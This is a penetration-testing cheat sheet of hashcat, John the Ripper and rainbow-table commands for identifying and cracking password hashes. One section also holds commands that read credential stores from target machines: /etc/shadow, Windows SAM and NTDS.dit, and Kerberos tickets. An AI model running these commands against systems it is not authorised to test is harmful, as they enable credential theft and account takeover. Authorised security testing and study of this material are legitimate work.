# Hash Identification and Cracking Guide

> Practical reference for identifying unknown hashes and cracking them with hashcat, John the Ripper, and rainbow tables. Covers hash mode selection, rule-based attacks, and optimization techniques.

## 1. Hash Identification

Before cracking, identify the hash algorithm. Use multiple tools for confidence.

```bash
# hashid — identify hash type from a string
hashid '$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy'
# Output: [+] Blowfish(OpenBSD)

# hash-identifier (interactive)
hash-identifier
# Paste hash when prompted

# hashcat built-in example hashes for reference
hashcat --example-hashes | grep -B2 -A2 "bcrypt"

# haiti — modern hash identifier with hashcat/john mode mapping
haiti '5f4dcc3b5aa765d61d8327deb882cf99'
# Output: MD5 [Hashcat: 0] [John: raw-md5]
```

## 2. Hashcat Mode Selection

Hashcat uses numeric modes for each algorithm. Common modes for penetration testing:

```bash
# Common hash modes
# 0     = MD5
# 100   = SHA1
# 1000  = NTLM
# 1800  = sha512crypt (Linux /etc/shadow)
# 3200  = bcrypt
# 5500  = NetNTLMv1
# 5600  = NetNTLMv2
# 13100 = Kerberos TGS-REP (Kerberoasting)
# 18200 = Kerberos AS-REP (ASREPRoasting)
# 22000 = WPA-PBKDF2-PMKID+EAPOL

# Crack NTLM hashes with wordlist
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack sha512crypt with rules
hashcat -m 1800 shadow_hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked results
hashcat -m 1000 ntlm_hashes.txt --show
```

## 3. Hashcat Attack Modes

```bash
# Dictionary attack (mode 0)
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Combination attack (mode 1) — combines two wordlists
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# Brute-force / mask attack (mode 3)
# ?l=lowercase ?u=uppercase ?d=digit ?s=special ?a=all
hashcat -m 0 -a 3 hashes.txt '?u?l?l?l?l?d?d?s'

# Hybrid wordlist + mask (mode 6)
hashcat -m 0 -a 6 hashes.txt wordlist.txt '?d?d?d?d'

# Hybrid mask + wordlist (mode 7)
hashcat -m 0 -a 7 hashes.txt '?d?d?d?d' wordlist.txt
```

## 4. John the Ripper Rules

John excels at rule-based mangling for password mutations.

```bash
# Basic crack with default rules
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Specify format explicitly
john --format=raw-md5 --wordlist=wordlist.txt hashes.txt

# Use aggressive rules
john --wordlist=wordlist.txt --rules=jumbo hashes.txt

# Custom rule in john.conf — append 2 digits and capitalize first
# Add to [List.Rules:Custom]
# c $[0-9]$[0-9]
john --wordlist=wordlist.txt --rules=Custom hashes.txt

# Show cracked passwords
john --show hashes.txt

# Generate candidate passwords without cracking (for piping)
john --wordlist=wordlist.txt --rules --stdout | head -20
```

## 5. Rainbow Table Attacks

Pre-computed tables trade storage for speed. Effective against unsalted hashes only.

```bash
# Generate rainbow tables with rtgen (RainbowCrack)
rtgen md5 loweralpha-numeric 1 7 0 3800 33554432 0

# Sort tables before use
rtsort /path/to/tables/*.rt

# Crack with rainbow tables
rcrack /path/to/tables/ -h 5d41402abc4b2a76b9719d911017c592

# Using ophcrack for Windows LM/NTLM hashes (GUI or CLI)
ophcrack -d /usr/share/ophcrack/tables -t /usr/share/ophcrack/tables -f ntlm_hashes.txt
```

## 6. Performance Optimization

```bash
# Check device status and speed benchmarks
hashcat -b -m 1000

# Use GPU workload tuning
hashcat -m 1000 -w 3 hashes.txt wordlist.txt
# -w 1=low, 2=default, 3=high, 4=nightmare

# Distribute across multiple GPUs
hashcat -m 1000 -d 1,2,3 hashes.txt wordlist.txt

# Session management for long cracks
hashcat -m 1800 --session=shadow_crack hashes.txt wordlist.txt -r rules.rule
# Resume interrupted session
hashcat --session=shadow_crack --restore

# Potfile management — skip already-cracked hashes
hashcat -m 1000 hashes.txt wordlist.txt --potfile-path=project.pot
```

## 7. Extracting Hashes from Targets

```bash
# Linux shadow file
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Windows SAM (from meterpreter or local)
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Kerberoasting — extract TGS tickets
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -outputfile tgs_hashes.txt

# NTDS.dit extraction (Domain Controller)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile domain_hashes

# WiFi handshake conversion for hashcat
hcxpcapngtool capture.pcapng -o wifi_hash.22000
```

## 8. Wordlist Preparation

```bash
# Combine and deduplicate wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Generate targeted wordlist with CeWL (from website)
cewl https://target.com -d 3 -m 5 -w target_words.txt

# Create password mutations with hashcat utils
/usr/lib/hashcat-utils/combinator.bin list1.txt list2.txt > combined_pairs.txt

# Use CUPP for profiled wordlist generation
cupp -i
# Follow prompts with target's personal info

# Filter wordlist by password policy (min 8 chars, has digit)
grep -E '^.{8,}$' wordlist.txt | grep '[0-9]' > policy_filtered.txt
```
